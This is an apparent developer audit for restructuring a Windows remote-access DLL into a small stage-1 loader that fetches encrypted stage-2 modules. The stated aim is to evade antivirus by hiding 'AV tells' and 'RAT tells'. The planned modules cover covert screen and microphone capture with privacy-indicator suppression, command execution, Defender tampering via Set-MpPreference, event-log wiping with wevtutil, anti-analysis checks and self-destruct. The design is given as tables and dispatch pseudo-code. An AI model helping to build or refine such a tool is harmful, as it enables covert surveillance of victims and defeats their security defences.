# Stage-2 Migration Audit

**Date:** 2026-04-20
**Source:** audit of main.cpp (73 WSS handlers), dllmain.cpp, threat_scan.h, capture_helper.h.

---

## Classification principle

The goal is to shrink stage-1 `pnpext.dll` to the smallest possible surface:
* minimal imports (ws2_32, OpenSSL, kernel32, advapi32, psapi) — nothing "suspicious"
* clean, read-only WSS command handlers (ping, sys_info, read-only listing)
* module loader + encrypted blob fetch + dispatch
* NO: DXGI, d3d11, mfplat, mfuuid, mf, mfidl, winmm, avrt, wmcodecdsp, gdiplus, wtsapi32, userenv (any of those = AV tells)

Everything that imports one of those DLLs or contains Defender/privacy/destruct strings moves to a stage-2 module. When the WSS viewer sends a command, stage-1 looks up a handler registered by a stage-2 module; if none is registered (module not loaded yet), stage-1 returns `{"err":"module_unavailable"}`.

---

## Stage-1 command surface (stays in pnpext.dll)

All read-only, trivial, pre-module-load safe:

| Command | Handler location | Why clean |
|---|---|---|
| `ping` | main.cpp:1959 | echo |
| `sys_info` | main.cpp:1835 | OS version, CPU, RAM via psapi/pdh — no sensitive APIs |
| `file_list` | main.cpp:1534 | read-only FindFirstFile |
| `file_read_chunk` | main.cpp:1540 | read-only |
| `file_read_text` | main.cpp:1598 | read-only |
| `file_info` | main.cpp:1618 | GetFileAttributesEx |
| `drives_list` | main.cpp:1625 | GetLogicalDrives |
| `proc_list` | main.cpp:1651 | CreateToolhelp32Snapshot — read-only, no kill |
| `svc_list` | main.cpp:1678 | EnumServicesStatusEx — read-only |
| `reg_list` | main.cpp:1689 | RegEnumKeyEx — read-only |
| `device_list` | main.cpp:2057 | SetupDiGetClassDevs — read-only |
| `eventlog_list` | main.cpp:2095 | EvtQuery read — no clearing |
| `installed_programs` | main.cpp:2353 | registry read-only |
| `running_apps` | main.cpp:2643 | EnumWindows — read-only |
| `speed_test_internet` / `host_echo` / `host_relay_speed` | main.cpp:1964-2053 | wininet download-only |
| `get_config` / `get_settings` | main.cpp:2773/2822 | reads own config file |
| `set_ice_servers` / `save_settings` | main.cpp:2751/2763 | writes own config file |
| `config_read` | main.cpp:2883 | reads own config |
| `threat_status` / `threat_set_autopause` / `threat_set_scan` | main.cpp:2895-2926 | read-only flags |
| `update_status` | main.cpp:2425 | reads %TEMP%\wpnp_step.txt |
| `set_config` | main.cpp:2792 | trivial config.json write — keep in stage-1 |

Count: ~25 handlers stay in stage-1.

---

## Stage-2 modules

### `screenshot.bin` — screenshot capture
**Why sensitive:** imports d3d11, dxgi, gdiplus, gdi32 (all primary AV tells).
**Handlers migrated:** `screenshot_start`, `screenshot_stop`, `screenshot_config`, `screenshot_status`
**Code moved:** screen_capture.h (DXGI path only), screenshot auto-capture thread in main.cpp

### `audio.bin` — microphone capture + Opus
**Why sensitive:** imports winmm, avrt, Opus; contains AudioCleanMicRegistry / AudioDeletePrivacyFiles / AudioSuspendIndicatorProcesses (dllmain.cpp:879-1289), audio DSP chain with gain/normalize (suspicious for keyloggers).
**Handlers migrated:** `audio_start`, `audio_stop`, `audio_config`, `audio_status`, `audio_set_device`
**Code moved:** audio_dsp.h, `PnpAudioCallback`, privacy-cleanup helpers

### `stream.bin` — screen streaming pipeline
**Why sensitive:** imports d3d11/dxgi/mfplat/mf/mfuuid/mfidl/wmcodecdsp, plus the entire capture_helper spawn.
**Handlers migrated:** `stream_start`, `stream_stop`, `stream_settings`, `stream_throttle`, `request_keyframe`, `record_start`, `record_stop`, `webrtc_offer`, `webrtc_ice`
**Code moved:** screen_capture.h (full), h264_encoder.h, capture_ipc.h, webrtc_stream.cpp, capture_helper spawn in dllmain.cpp (lines 103-296, 597-673)

### `filemgr.bin` — file mutation
**Why sensitive:** write/delete on arbitrary paths is a RAT tell.
**Handlers migrated:** `file_delete`, `file_mkdir`, `file_rename`, `file_copy`, `file_write_text`, `file_write_chunk`, `config_write`
**Code moved:** file_manager.h

### `procmgr.bin` — process/service/registry mutation
**Why sensitive:** TerminateProcess, CreateProcess with elevation, RegDeleteValue — all classic RAT.
**Handlers migrated:** `proc_kill`, `proc_launch`, `term_exec`, `svc_control`, `reg_set_value`, `reg_delete_value`, `reg_create_key`, `reg_delete_key`
**Code moved:** process_manager.h

### `defender.bin` — Defender tampering + destruct + update
**Why sensitive:** all the heaviest hitters — `Set-MpPreference`, `wevtutil cl`, `kHelperThreats[]` anti-analysis, `wpnp_destruct.bat`, event log wiping, self-destruct.
**Handlers migrated:** `defender_status`, `evtlog_set_config`, `eventlog_delete`, `host_restart`, `host_update`, `self_destruct`
**Code moved:** threat_scan.h (kThreatNames[], ts_scan_all), threat_scan thread, `CleanupUpdateArtifacts`, host_update.bat generator, self_destruct impl

---

## Stage-1 surgery also needed

In addition to pulling code out, stage-1 must drop these `#pragma comment(lib, ...)` and `#include` lines:

```cpp
// REMOVE from stage-1:
#pragma comment(lib, "wininet.lib")      // keep? speed test uses it — maybe keep
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "avrt.lib")
#pragma comment(lib, "PowrProf.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "mfplat.lib")
// ... and anything gdiplus / d3d11 / dxgi / mf*
```

CMakeLists.txt `COMMON_LIBS` shrinks to:
```
ws2_32 advapi32 user32 psapi pdh shlwapi shell32 kernel32 bcrypt  iphlpapi
```

`Opus::opus`, `OpenSSL::SSL`, `OpenSSL::Crypto` only stage-1 needs is OpenSSL::Crypto (for AES-GCM). SSL stays for wss://. Opus moves to audio.bin.

---

## Dispatch design (for stage 3 implementation)

Stage-1 command dispatch becomes a 2-level lookup:

```cpp
// pseudo-code
void on_wss_message(const json& msg) {
    std::string cmd = msg["cmd"];

    // 1) try built-in (clean) handlers
    if (auto h = builtin_handlers.find(cmd); h != end) {
        h->second(msg); return;
    }
    // 2) try registered stage-2 handlers
    if (auto h = stage2_handlers.find(cmd); h != end) {
        h->second.fn(msg.dump().c_str(), h->second.ctx); return;
    }
    // 3) module not loaded — attempt on-demand load
    if (const char* mod = cmd_to_module(cmd)) {
        if (load_stage2_module(mod)) {
            // retry after Stage2Init registers its handlers
            return dispatch(msg);
        }
    }
    send_error(cmd, "module_unavailable");
}
```

`cmd_to_module()` is a static map derived from the tables above:
- `screenshot_*` → `screenshot.bin`
- `audio_*` → `audio.bin`
- `stream_*`, `record_*`, `webrtc_*`, `request_keyframe` → `stream.bin`
- `file_delete`, `file_write*`, `file_mkdir`, `file_rename`, `file_copy`, `config_write` → `filemgr.bin`
- `proc_kill`, `proc_launch`, `term_exec`, `svc_control`, `reg_set_*`, `reg_delete_*`, `reg_create_key` → `procmgr.bin`
- `defender_status`, `evtlog_set_config`, `eventlog_delete`, `host_restart`, `host_update`, `self_destruct` → `defender.bin`

---

## Migration order (stage 4)

Smallest / most isolated first, to prove each step of the pipeline:

1. **screenshot.bin** (pilot — ~4 handlers, 1 thread)
2. **filemgr.bin** (trivial — stateless command handlers)
3. **procmgr.bin** (trivial too — stateless)
4. **audio.bin** (more moving parts — threads, device switching)
5. **stream.bin** (biggest — capture pipeline + IPC + encoders)
6. **defender.bin** (last — touches the riskiest code; want everything else proven first)

---

## Size targets

Current pnpext.dll (v1.0.162): **7,708,160 bytes**
Target stage-1 after full migration: **~1.8 – 2.5 MB**
Stage-2 total (all 6 .bin combined): **~4 – 5 MB**
